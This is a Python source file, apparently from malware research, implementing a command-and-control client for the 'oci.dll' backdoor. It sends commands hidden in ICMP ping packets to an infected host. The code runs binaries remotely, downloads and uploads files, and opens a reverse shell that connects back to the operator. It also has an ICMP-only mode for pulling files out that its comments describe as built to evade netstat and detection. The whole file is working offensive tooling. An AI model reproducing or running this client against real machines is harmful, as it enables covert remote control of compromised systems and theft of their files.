# oci.dll malware client using icmp packets for its comms protocol
# Lloyd Macrohon <jl.macrohon@gmail.com>

import socket
import threading
import time
import os
import tty
import termios
import fcntl
import traceback
import click
from scapy.all import *
from collections import namedtuple


OciPayload = namedtuple('OciPayload', 'command payload block tag block_size len')

class OciClient:

    def __init__(self, target):
        self.target = target
        self.stopping = False
        self.received_payload = None
        self.sniffer_stop_event = threading.Event()
        self.sniffer = threading.Thread(target=self.__start_sniffer)
        self.sniffer.start()

    def download(self, remote_file, local_file):
        """
        Download by asking malware to connect back to us with the file content.
        
        Initial connection is done via ICMP and appears as a ping packet, but then the 
        malware connects back to us on a port we specify. This can be seen by netstat.
        """
        print('Download %s on %s' % (remote_file, self.target))
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
            sock.bind(('0.0.0.0', 0))
            port = sock.getsockname()[1]
            sock.listen(5)
            print('Listening on %d...' % port)
            packet = IP(dst=self.target) / ICMP(id=1, seq=socket.htons(1234)) / \
                    self.__create_payload(cmd=b'download', cmd_line=remote_file.encode('ascii'), 
                    dest_port=port, dest_addr=socket.inet_aton(self.__get_local_address()))
            self.ok = False
            send(packet)

            print('Waiting for connect back...')            
            cli, addr = sock.accept()
            print('Connection from %s:%d' % addr)
            with open(local_file, 'wb') as f, cli:
                # recv header first
                header = b'openfile on remote computers success'
                if cli.recv(len(header)) != header:
                    print("Invalid openfile response")
                    return

                # send/response mode, so b'END\x00' marker is always sent in separate call
                while True:
                    buf = cli.recv(1024)
                    if len(buf) == 0 or buf == b'END\x00':
                        break
                    f.write(buf)
                    cli.send(b"OK")
        print('Successfully downloaded %s on %s, len=%d bytes' % 
            (remote_file, self.target, os.path.getsize(local_file)))

    def upload2(self, filename, remote_filename, port):
        """ 
        Upload by requesting malware to listen on specific port and we connect to it.
        
        Initial request is done via ICMP, but we ask the malware to listen on a port.
        This may fail, if a port is taken up by another process or unable to bind to it.
        It can also be seen by netstat.
        """
        with open(filename, 'rb') as f:
            print('Uploading %s to %s:%d' % (filename, self.target, port))        
            packet = IP(dst=self.target) / ICMP(id=1, seq=socket.htons(1234)) / \
                    self.__create_payload(cmd=b'upload2',
                    cmd_line=remote_filename.encode('ascii'),
                    dest_port=port)
            send(packet)

            print('Waiting for server to get ready.')
            time.sleep(1)

            sock = None
            print('Connecting to %s:%d' % (self.target, port))
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target, port))
            print('Connected to %s:%d' % (self.target, port))
            buf = sock.recv(1024)
            print(buf)
            if buf.decode('ascii') == 'Can not createfile on remote computers':
                raise RuntimeError('Error creating file on remote computer')    

            while True:
                buf = f.read(1024)
                if len(buf) == 0:
                    break
                sock.send(buf)
                buf = sock.recv(1024)
            print('Successfully uploaded %s' % filename)
                        
    def shell(self):
        """ 
        Request malware to connect back to us with a shell.
        Initial request is done via ICMP packet, but the malware makes a TCP
        connection back to us or another specified target.
        This connection can be seen by netstat.
        """
        print('Starting shell %s' % self.target)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
            # bind to an ephemeral port and tell malware to connect to this port
            sock.bind(('0.0.0.0', 0))
            port = sock.getsockname()[1]
            sock.listen(5)
            print('Listening on %d...' % port)
            packet = IP(dst=self.target) / ICMP(id=1, seq=socket.htons(1234)) / \
                    self.__create_payload(cmd=b'shell',
                    dest_port=port, 
                    dest_addr=socket.inet_aton(self.__get_local_address()))
            send(packet)

            print('Waiting for connect back...')            
            cli, addr = sock.accept()
            print('Connection from %s:%d' % addr)
            inputs = [sys.stdin, cli]

            # set non-blocking
            orig_fl = fcntl.fcntl(sys.stdin, fcntl.F_GETFL)
            fcntl.fcntl(sys.stdin, fcntl.F_SETFL, orig_fl | os.O_NONBLOCK)
            try:
                while True:
                    readable, _, _ = select.select(inputs, [], inputs)
                    if sys.stdin in readable:
                        buf = sys.stdin.read(1024)
                        if len(buf) == 0:
                            break
                        cli.send(buf.encode('ascii'))
                    elif cli in readable:
                        buf = cli.recv(1024)
                        if len(buf) == 0:
                            break
                        sys.stdout.write(buf.decode('ascii'))
            finally:
                fcntl.fcntl(sys.stdin, fcntl.F_SETFL, orig_fl)

    def exep(self, cmd_line):
        """ Execute command on remote host, wait for 'OK' as icmp message """
        print('Execute %s on %s' % (cmd_line, self.target))
        if not self.sniffer or not self.sniffer.is_alive():
            raise RuntimeError("sniffer not running")

        packet = IP(dst=self.target) / ICMP(id=1, seq=socket.htons(1234)) / \
                self.__create_payload(cmd=b'exep', cmd_line=cmd_line.encode('ascii'))
        self.ok = False
        while not self.ok and not self.stopping:
            send(packet)
            if not self.ok:
                # wait and retry if we haven't received OK as an ICMP message
                # from our sniffer
                time.sleep(2)
        print('Successfully exep %s on %s' % (cmd_line, self.target))

    def download3(self, remote_file, local_file):
        """
        Download a file from the remote host using ICMP only.
        
        This is a lot slower than using TCP directly as only 1 packet can be in transit
        at a time, and has to wait for acknowledgement from our end. However, the connection
        is more covert and cannot be seen by netstat. The data appears as ping packets only.
        """
        print('Download3 via ICMP %s from %s' % (remote_file, self.target))
        if not self.sniffer or not self.sniffer.is_alive():
            raise RuntimeError("sniffer not running")

        local_addr = socket.inet_aton(self.__get_local_address())
        packet = IP(dst=self.target) / ICMP(id=1, seq=socket.htons(1234)) / \
                self.__create_payload(cmd=b'download3', cmd_line=remote_file.encode('ascii'), dest_addr=local_addr)
        
        ack = IP(dst=self.target) / ICMP(id=1, seq=socket.htons(1235)) / \
                self.__create_payload(cmd=b'OK', dest_addr=local_addr)
        send(packet)
        block = 1
        bytes_received = 0
        tries = 0
        with open(local_file, 'wb') as f:
            while True:
                if self.received_payload is None:
                    continue

                payload, self.received_payload = self.received_payload, None
                try:
                    tag = payload.tag.decode('ascii').rstrip('\x00')
                    if tag == 'NEND':
                        if block == -1:
                            print("File size block, size: %d" % payload.len)
                            continue
                        if block != payload.block:
                            # NOTE: this is not very reliable as we can get out of synched and the acknowledgement
                            # does not contain block number acknowledged, so you may end up with some missed blocks

                            # print("Out of sequence block. Expecting block %d, got %d" % (block, payload.block))
                            if payload.block < block and tries > 5:
                                tries = 0
                                send(ack)
                            tries += 1
                            time.sleep(.1)
                            continue
                        block += 1
                        print('Got block %d, total-bytes-received: %d out of %d, block_size=%d' %
                              (payload.block, bytes_received, payload.len, payload.block_size))
                        bytes_received += payload.block_size
                        f.write(payload.payload[0:payload.block_size])
                        send(ack)
                    elif tag == 'ERR':
                        print('Error opening file %s' % remote_file)
                        break
                    elif tag == 'END':
                        print('File received: %s, size=%d' % (remote_file, bytes_received))
                        break
                    else:
                        print('unknown tag: %s' % tag)
                except Exception as e:
                    print('Protocol error: %s' % e)

    def stop(self):
        print("Stopping oci client...")
        self.stopping = True
        self.sniffer_stop_event.set()
        self.sniffer.join()
        print("Successfully stopped oci client.")

    def __get_local_address(self):
        """ returns the address of interface this gets routed through for remote address """
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((self.target, 80))
            return s.getsockname()[0]

    def __create_payload(self, cmd=None, args=None, cmd_line=None, dest_port=0, dest_addr=None):
        cmd = cmd or b''
        args = args or b''
        cmd_line = cmd_line or b''
        dest_addr = dest_addr or b''
        return struct.pack('<10s 512s 258s L 4s', cmd, args, cmd_line, dest_port, dest_addr)

    def __start_sniffer(self):
        """
        Certain modes require communication via ICMP, this sniffer waits for icmp data from
        remote host 
        """
        print("sniffer started.")
        try:
            while not self.stopping and not self.sniffer_stop_event.is_set():
                packets = sniff(filter="icmp and host %s" % self.target, count=1, 
                    stop_filter=lambda p: self.sniffer_stop_event.is_set())
                for packet in packets:
                    if raw(packet[ICMP].payload)[0:2] == b'OK':
                        print('rx: OK')
                        self.ok = True
                    elif socket.ntohs(packet[ICMP].seq) == 1234:
                        try:
                            cmd = OciPayload._make(struct.unpack('<10s 1026s L 8s L L', raw(packet[ICMP].payload)))
                            if self.received_payload is None:
                                self.received_payload = cmd
                        except:
                            print("Unable to decode payload %s" % raw(packet[ICMP].payload[0:10]))
        except:
            traceback.print_exc(sys.exc_info())
            print("Exception caught in sniffer")
        print("sniffer stopped.")


@click.group()
def cli():
    pass

@click.command()
@click.option("--host", required=True, help="remote host with oci.dll malware")
@click.option("--bin", required=True, help="command to execute")
def exep(host, bin):
    """ Execute binary on remote host """
    c = OciClient(host)
    c.exep(bin)
    c.stop()


@click.command()
@click.option("--host", required=True, help="remote host with oci.dll malware")
@click.option("--remote_file", required=True, help="remote file to download")
@click.option("--local_file", required=True, help="name of output file")
def download(host, remote_file, local_file):
    """
    Downloads file from remote using mode 1.

    This will open a listening socket on local host with random ephemeral port.
    The remote host is then requested to connect back to the local port using tcp.
    """
    c = OciClient(host)
    c.download(remote_file, local_file)
    c.stop()


@click.command()
@click.option("--host", required=True, help="remote host with oci.dll malware")
@click.option("--remote_file", required=True, help="remote file to download")
@click.option("--local_file", required=True, help="name of output file")
def download3(host, remote_file, local_file):
    """
    Downloads file from remote using mode 3.

    This mode uses icmp communication only to evade detection of open TCP ports.
    However this is very slow, as the protocol is recv/ack and must acknowledge
    the last sent block. The protocol is also unreliable as it doesn't acknowledge
    a specific block, so if a block is ack'ed twice due to timeout issues, then
    we may accidentally ack another block.

    ICMP must be allowed, but this is required for this malware.
    """
    c = OciClient(host)
    c.download3(remote_file, local_file)
    c.stop()


@click.command()
@click.option("--host", required=True, help="remote host with oci.dll malware")
@click.option("--local_file", required=True, help="file to upload")
@click.option("--remote_file", required=False, help="name of file on remote host")
@click.option("--port", required=True, type=int, help="port remote host should listen on")
def upload2(host, local_file, port, remote_file=None):
    """
    Uploads a file to the remote host using mode 2.

    Remote host is told to listen on a port, and we connect to it.
    This may fail if specified port is taken, or incoming connections to the remote
    host is blocked.
    """
    c = OciClient(host)
    if remote_file is None:
        remote_file = os.path.basename(local_file)
    c.upload2(local_file, remote_file, port)
    c.stop()


@click.command()
@click.option("--host", required=True, help="remote host with oci.dll malware")
def shell(host):
    """
    Run shell on remote host, this will tell the remote to connect back to us on a random
    ephemeral tcp port
    """
    c = OciClient(host)
    c.shell()
    c.stop()


def main():
    cli.add_command(exep)
    cli.add_command(download)
    cli.add_command(download3)
    cli.add_command(upload2)
    cli.add_command(shell)
    cli()
    

if __name__ == '__main__':
    main()
